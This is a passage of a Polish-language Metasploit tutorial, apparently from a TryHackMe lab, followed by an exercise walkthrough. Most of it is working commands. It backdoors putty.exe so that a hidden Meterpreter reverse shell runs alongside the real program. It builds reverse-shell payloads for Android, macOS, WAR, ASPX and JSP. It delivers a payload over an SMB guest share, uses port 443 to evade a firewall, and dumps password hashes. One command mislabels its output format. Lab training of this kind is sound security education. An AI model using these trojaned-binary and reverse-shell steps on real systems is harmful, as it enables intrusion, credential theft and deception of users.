Uruchomienie `shikata_ga_nai`10 iteracji z domyślnym ładunkiem Meterpretera zostanie wykryte przez praktycznie każdy nowoczesny produkt do ochrony punktów końcowych. Sam szczątkowy dekoder XOR jest obecnie dobrze znanym podpisem.

## Kiedy kodowanie jest nadal przydatne

Mimo że kodowanie nie jest strategią unikania, pozostaje użyteczne w swoim pierwotnym celu: **unikaniu złych znaków podczas tworzenia exploitów** . Jeśli piszesz exploita przepełnienia bufora, a Twój ładunek musi unikać zerowych bajtów i nowych linii, kodowanie rozwiązuje ten problem w sposób przejrzysty. Jest to uzasadniony wymóg techniczny, a nie technika ukrycia.

Jeśli potrzebujesz faktycznego unikania nowoczesnych obron, ścieżka prowadzi dalej `msfvenom`, do niestandardowych ładowarek, technik wstrzykiwania procesów,AMSIMetody omijania zabezpieczeń i narzędzia do zaciemniania danych. Te tematy są omówione w bardziej zaawansowanych modułach platformy TryHackMe.

Do tej pory każdy wygenerowany przez nas ładunek był samodzielnym plikiem, świeżym plikiem wykonywalnym zawierającym wyłącznie nasz ładunek. Ale co, jeśli chcesz, aby ładunek wyglądał jak legalna aplikacja? A co z celami poza systemem Windows i…LinuxW tym zadaniu zajmiemy się wstrzykiwaniem ładunków do istniejących plików binarnych i generowaniem ładunków dla platform aplikacji mobilnych i internetowych.

## Wstrzykiwanie ładunków do istniejących plików binarnych

Flaga `-x`nakazuje `msfvenom`użycie istniejącego pliku wykonywalnego jako **szablonu** . Ładunek jest wstrzykiwany do pliku binarnego, a wynikowy plik wydaje się być (a w niektórych przypadkach nadal działa jak) oryginalną aplikacją.

Rozważmy następujący scenariusz: chcesz dostarczyć ładunek podszywający się pod legalne narzędzie systemu Windows. Bierzesz kopię `putty.exe`i wstrzykujesz do niej ładunek Meterpretera:

Pole ataku

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -x /root/templates/putty.exe -f exe -o putty_backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201798 bytes
Final size of exe file: 1553920 bytes
Saved as: putty_backdoor.exe
```

Plik wyjściowy ma rozmiar około 1,5 MB (rozmiar oryginalnego pliku binarnego PuTTY plus wstrzyknięty ładunek). Gdy użytkownik uruchamia program `putty_backdoor.exe`, ładunek jest wykonywany i łączy się z programem obsługi.

**Zachowanie oryginalnego zachowania z`-k`**

Domyślnie, gdy ładunek jest wstrzykiwany za pomocą `-x`, funkcjonalność oryginalnej aplikacji może zostać zakłócona. `-k`Flaga próbuje zachować oryginalne zachowanie szablonu poprzez uruchomienie ładunku w osobnym wątku:

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -x /root/templates/putty.exe -k -f exe -o putty_backdoor.exe
```

Dzięki temu `-k`powstały plik binarny powinien normalnie uruchomić PuTTY, jednocześnie wykonując ładunek w tle. Użytkownik widzi oczekiwaną aplikację; atakujący uzyskuje sesję.

**Kompromisy w zakresie wykrywania**

Wstrzyknięcie szablonu niesie ze sobą kilka zagrożeń, o których należy wiedzieć:

- **Niezgodność skrótu** : skrót pliku wstrzykniętego pliku binarnego będzie się różnić od skrótu oryginału. Każdy system sprawdzający integralność, który porównuje skróty plików ze znanymi, prawidłowymi wartościami, zasygnalizuje to.
- **Złamanie podpisu cyfrowego** : Jeśli oryginalny plik binarny był podpisany cyfrowo (jak większość legalnego oprogramowania), podpis staje się nieważny po wstrzyknięciu. System Windows wyświetli ostrzeżenie „nie można zweryfikować wydawcy”, a narzędzia do weryfikacji podpisów oznaczą plik.
- **Heurystyka antywirusowa** : Większość programów antywirusowych skanuje w poszukiwaniu wzorca legalnych plików binarnych z wstrzykniętymi fragmentami kodu. Ta technika jest dobrze znana i powszechnie wykrywana.

Wstrzykiwanie szablonów to użyteczna technika w kontrolowanych środowiskach laboratoryjnych i w wyzwaniach CTF. W rzeczywistych starciach z chronionymi sieciami wymaga ona dodatkowego zaciemniania, aby była praktyczna.

## Ładunki wieloplatformowe

Msfvenom obsługuje generowanie ładunku dla platform innych niż Windows i Linux. Oto najczęściej spotykane.

**Android (APK)**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -o evil.apk
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10188 bytes
Saved as: evil.apk
```

Format APK to pakiet aplikacji Androida. Wygenerowany plik można wgrać na urządzenie z Androidem w celu przetestowania. Należy pamiętać, że współczesne wersje Androida wymagają trybu programisty i wyraźnej zgody użytkownika na instalowanie aplikacji z nieznanych źródeł. `-f`Flaga nie jest wymagana; `msfvenom`automatycznie wybiera prawidłowy format dla ładunków Androida.

**macOS (Mach-O)**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f macho -o shell.macho
```

Format **Mach-O (Mach Object)** to natywny format binarny systemu macOS, odpowiednik ELF w systemie Linux i PE w systemie Windows.

**Aplikacja internetowa Java (WAR)**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p java/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f war -o shell.war
```

Plik **WAR (Web Application Resource)** jest wdrażany na serwerach aplikacji Java, takich jak Apache Tomcat, JBoss lub GlassFish. Jeśli masz dostęp do interfejsu Tomcat Manager (często z domyślnymi uprawnieniami), możesz wdrożyć plik WAR za pośrednictwem interfejsu webowego, a ładunek zostanie wykonany po przejściu do adresu URL wdrożonej aplikacji.

**ASP/ASPX dla IIS**

Pole ataku

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f aspx -o shell.aspx
```

Powłoki internetowe ASPX są przeznaczone dla firmy MicrosoftIISSerwery WWW z systemem .NET Framework. Podobnie jak ładunki PHP, są one przesyłane przez luki w zabezpieczeniach związane z przesyłaniem plików i aktywowane po przejściu na adres URL przesłanego pliku.

**JSP**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p java/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f jsp -o shell.jsp
```

**Ładunki JSP (JavaServer Pages)** działają podobnie doPHPładunki, ale są skierowane do serwerów WWW opartych na Javie. Stanowią alternatywę dla plików WAR, gdy można przesyłać pojedyncze pliki, ale nie można wdrożyć pełnego pakietu WAR.

## Wybór właściwej platformy i formatu

Drzewo decyzyjne jest proste:

1. **Jaki system operacyjny jest uruchomiony na komputerze docelowym?** To określa platformę ładunku ( `windows/`, `linux/`, `osx/`, `android/`, `java/`, `php/`).
2. **Jak dostarczysz ładunek?** To determinuje format. Zrzucenie pliku → format pliku wykonywalnego ( `exe`, `elf`, `macho`, `apk`). Przesłanie do sieci → format sieciowy ( `php`, `asp`, `aspx`, `jsp`, `war`). Wstrzyknięcie kodu → format transformacji ( `raw`, `c`, `python`).
3. **Jakie środowisko wykonawcze jest dostępne?** Jeśli cel ma PHP, używać PHP Jeśli ma Javę, użyj WAR lub JSP. Jeśli jest to pusty System operacyjny bez interpretatora, użyj natywnego pliku binarnego.

Wygenerowałeś ładunek za pomocą `msfvenom`. Dostarczyłeś go do celu. Co teraz? Jeśli ładunek korzysta z połączenia odwrotnego (a większość tak robi), potrzebuje miejsca, z którym może się połączyć _._ Tym miejscem jest **handler** : program nasłuchujący działający na maszynie atakującej, który akceptuje połączenia przychodzące i nawiązuje sesje.

### Konfigurowanie exploita/multi/handlera

Moduł `exploit/multi/handler`jest uniwersalnym nasłuchiwaczem Metasploit. Działa z każdym typem ładunku w frameworku: Meterpreterem, powłokami poleceń, odwrotnymi powłokami PHP, powłokami Pythona i wieloma innymi. Konfiguruje się go `msfconsole`tak samo, jak każdy inny moduł.

Prześledźmy cały proces. Załóżmy, że wygenerowałeś ten ładunek:

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f elf -o shell.exe
```

Teraz skonfiguruj obsługę połączenia:

Terminal AttackBox

```shell-session
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST CONNECTION_IP
LHOST => CONNECTION_IP
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

 Name  Current Setting  Required  Description
 ----  ---------------  --------  -----------

Payload options (windows/x64/meterpreter_reverse_tcp):

 Name   Current Setting  Required  Description
 ----   ---------------  --------  -----------
 LHOST  CONNECTION_IP      yes       The listen address
 LPORT  4444             yes       The listen port

Exploit target:

 Id  Name
 --  ----
 0   Wildcard Target

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on CONNECTION_IP:4444
```

Program obsługi nasłuchuje. Gdy ładunek zostanie wykonany na celu i ponownie połączony z `CONNECTION_IP:4444`, program obsługi nawiąże sesję:

Pole ataku

```shell-session
[*] Meterpreter session 1 opened (CONNECTION_IP:4444 -> MACHINE_IP:55320) at 2026-03-18 17:15:42 +0000

meterpreter >
```

## Złota zasada: wszystko musi do siebie pasować

Najczęstszym powodem, dla którego handler nie przechwytuje powłoki, jest **niezgodność między konfiguracją handlera a wygenerowanym ładunkiem** . Trzy wartości muszą być identyczne:

|Parametr|W msfvenom|W trybie wielokrotnym/obsługującym|Musi pasować?|
|---|---|---|---|
|Ładunek|`-p windows/x64/meterpreter_reverse_tcp`|`set PAYLOAD windows/x64/meterpreter_reverse_tcp`|Dokładnie|
|LHOST|`LHOST=CONNECTION_IP`|`set LHOST CONNECTION_IP`|Dokładnie|
|LPORT|`LPORT=4444`|`set LPORT 4444`|Dokładnie|

Jeśli którykolwiek z tych parametrów się różni, na przykład jeśli wygenerowałeś ładunek za pomocą , `LPORT=4444`ale ustawiłeś handler na nasłuchiwanie na `LPORT=5555`, połączenie zostanie przerwane bez powiadomienia. Nie pojawi się żaden komunikat o błędzie; cel łączy się, handler nie rozpoznaje typu połączenia i nic się nie dzieje.

Częstym błędem jest generowanie ładunku **etapowego** , ale ustawienie handlera na ładunek **bezetapowy** (lub odwrotnie). `windows/x64/meterpreter/reverse_tcp`(etapowy, z `/`) to _inny ładunek_ niż `windows/x64/meterpreter_reverse_tcp`(bezetapowy, z `_`). Handler musi dokładnie pasować.

## Pełny przepływ pracy Generuj → Dostarczaj → Przechwytuj

Prześledźmy kompletny, realistyczny przepływ pracy dla serwera Windows w Stratford Systems. Masz uprawnienia SSH i chcesz nawiązać sesję Meterpretera.

**Krok 1: Wygeneruj ładunek**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe
[...]
Saved as: shell.exe
```

**Krok 2: Uruchom program obsługi** (w osobnym terminalu lub w tle w konsoli msfconsole)

Terminal AttackBox

```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST CONNECTION_IP
LHOST => 10.10.14.12
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on CONNECTION_IP:4444
```

**Krok 3: Dostarcz ładunek** (z innego okna terminala)

Terminal AttackBox

```shell-session
msf6 > use auxiliary/admin/smb/upload_file[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOSTmsf6 auxiliary(admin/smb/upload_file) > set rhosts MACHINE_IPrhosts => 10.80.142.86msf6 auxiliary(admin/smb/upload_file) > set smbuser guestsmbuser => guestmsf6 auxiliary(admin/smb/upload_file) > set smbshare publicsmbshare => publicmsf6 auxiliary(admin/smb/upload_file) > set lpath /root/shell.exelpath => /root/shell.exemsf6 auxiliary(admin/smb/upload_file) > set rpath shell.exerpath => shell.exemsf6 auxiliary(admin/smb/upload_file) > exploit[+] MACHINE_IP:445 - /root/shell.exe uploaded to shell.exe[*] MACHINE_IP:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed
```

**Krok 4: Wykonaj ładunek na celu.** 

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765216406)

**Informacja:** Na rzeczywistym celu ładunek zostanie wykonany automatycznie po jego przesłaniu doMŚPudział.

Docelowy CMD

```shell-session
C:\public>shell.exe
```

**Krok 5: Przechwyć sesję** (z powrotem w msfconsole)

Pole ataku

```shell-session
[*] Meterpreter session 1 opened (CONNECTION_IP:4444 -> MACHINE_IP:55320) at 2026-03-18 17:20:15 +0000

meterpreter > sysinfoComputer        : CAPSTONEOS              : Windows Server 2019 (10.0 Build 17763).Architecture    : x64System Language : en_USDomain          : WORKGROUPLogged On Users : 0Meterpreter     : x64/windows
meterpreter >
```

Ładunek został wykonany na serwerze Stratford Windows, połączonym z naszym programem obsługi i teraz mamy pełnyMeterpretersesja.

## Wskazówki dla opiekuna

**Uruchamianie programu obsługi w tle**

Dodanie `-j`do `run`polecenia uruchamia procedurę obsługi jako zadanie w tle, dzięki czemu możesz kontynuować pracę, `msfconsole`podczas gdy oczekuje ona na połączenia:

Terminal AttackBox

```shell-session
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on CONNECTION_IP:4444
msf6 exploit(multi/handler) >
```

Po otwarciu sesji zobaczysz powiadomienie i będziesz mógł wejść z nim w interakcję za pomocą `sessions -i <id>`.

**Wyjście z sesji**

Domyślnie handler przestaje nasłuchiwać po nawiązaniu pierwszej sesji. Jeśli chcesz, aby nasłuchiwał kolejnych połączeń (np. po wdrożeniu tego samego ładunku na wielu celach), `ExitOnSession`ustaw `false`:

Terminal AttackBox

```shell-session
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
```

Jest to przydatne, gdy rozesłałeś ten sam ładunek do kilku hostów i chcesz, aby jeden program obsługiwał wszystkie sesje przychodzące.

**AutoRunScript**

Ta `AutoRunScript`opcja automatycznie uruchamia określone polecenie lub skrypt po otwarciu nowej sesji. Na przykład, aby automatycznie przenieść Meterpretera do bardziej stabilnego procesu:

Pole ataku

```shell-session
msf6 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate
```

Dzięki temu oszczędzasz sobie ręcznych czynności, gdy spodziewasz się wielu sesji i chcesz zachować spójną konfigurację po eksploatacji w każdej z nich.

CWICZENIE

To zadanie to świetne podsumowanie całego modułu Metasploit. Łączy ono rekonesans, generowanie payloadu, omijanie podstawowych zabezpieczeń sieciowych oraz post-eksploatację.

Ponieważ scenariusz wspomina, że **cel pozwala jedynie na ruch wychodzący HTTP/S**, musimy sprytnie skonfigurować port nasłuchiwania. Mimo że zgodnie z poradnikiem użyjemy bezstopniowego ładunku TCP (`meterpreter_reverse_tcp`), nasz handler musi nasłuchiwać na porcie dozwolonym przez zaporę sieciową – najlepiej **443** (HTTPS) lub **80** (HTTP).

Oto kompletny przewodnik krok po kroku, który pozwoli Ci zdobyć wszystkie flagi i odpowiedzi.

### Krok 1: Generowanie ładunku (msfvenom)

Musimy stworzyć bezstopniowy plik wykonywalny `.exe`. Upewnij się, że znasz adres IP swojego AttackBoxa (`ip addr` lub `ifconfig`). Zastosujemy port `443`, aby ruch powrotny oszukał zaporę sieciową celu.

Uruchom w terminalu AttackBoxa:

 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.128.64.211 LPORT=443 -f exe -o backdoor.exe

## 🚀 Instrukcja naprawcza krok po kroku

### Krok 1: Uruchomienie Handlera

W tej samej konsoli Metasploita, w której się znajdujesz, przełącz się na moduł nasłuchujący i ustaw nowe adresy IP:

Plaintext

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.130.87.218
set LPORT 443
exploit -j
```

### Krok 2: Ponowne przesłanie pliku (wyzwolenie połączenia)

Scenariusz pokoju THM zakłada, że zaplanowane zadanie usuwa i uruchamia pliki regularnie. Musimy wrzucić plik ponownie, aby mechanizm znowu go wykonał, gdy nasz handler już nasłuchuje:

Plaintext

```
use auxiliary/admin/smb/upload_file
set RHOSTS 10.130.155.15
set SMBSHARE public
set SMBUser guest
set SMBPass ""
set LPATH ./backdoor.exe
set RPATH backdoor.exe
run
```

Gdy tylko polecenie `run` pokaże sukces, odczekaj chwilę. Powinieneś zobaczyć na ekranie automatyczny komunikat: `[*] Meterpreter session 1 opened`.

### Krok 3: Przejęcie sesji i hashdump

Gdy sesja się pojawi, wchodzisz do niej i zrzucasz hashe:

Plaintext

```
sessions -i 1
hashdump
```

## 📑 Karta Komend: Uruchomienie i Przechwycenie

Plaintext

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.130.87.218
set LPORT 443
exploit -j
```

_Przygotowuje uniwersalne sidła na porcie 443, dopasowane do nowego adresu IP AttackBoxa._

Plaintext

```
use auxiliary/admin/smb/upload_file
set RHOSTS 10.130.155.15
set SMBSHARE public
set SMBUser guest
set SMBPass ""
set LPATH ./backdoor.exe
set RPATH backdoor.exe
run
```

_Wgrywa plik wykonywalny na zidentyfikowany wcześniej udział dla gości przy użyciu nowych adresów IP._

Plaintext

```
sessions -i 1
```

_Przechodzi w tryb interaktywny z przechwyconym systemem Windows._

## 📝 Notatka podsumowująca ćwiczenie (Karta komend)

W przypadku restartu środowiska laboratoryjnego zawsze pamiętaj o zachowaniu kolejności działań:

1. **Generowanie ładunku** (`msfvenom`) z nowym IP.
    
2. **Uruchomienie nasłuchiwania** (`multi/handler`) z nowym IP.
    
3. **Dostarczenie ładunku** (`upload_file`) na maszynę ofiary.

> ⚠️ **Przypomnienie o bezpieczeństwie laboratorium:** Ponieważ konfigurujesz środowisko od nowa po restarcie, jak tylko złapiesz stabilną powłokę Meterpretera i wykonasz `hashdump`, nie zapomnij od razu **zrobić snapshotu (migawki)** maszyn wirtualnych. To zaoszczędzi Ci ponownego ustawiania wszystkiego w przypadku kolejnego rozłączenia!

Opal handler, wrzuć plik jeszcze raz i daj znać, czy zielony komunikat o otwarciu sesji tym razem wskoczył na ekran!
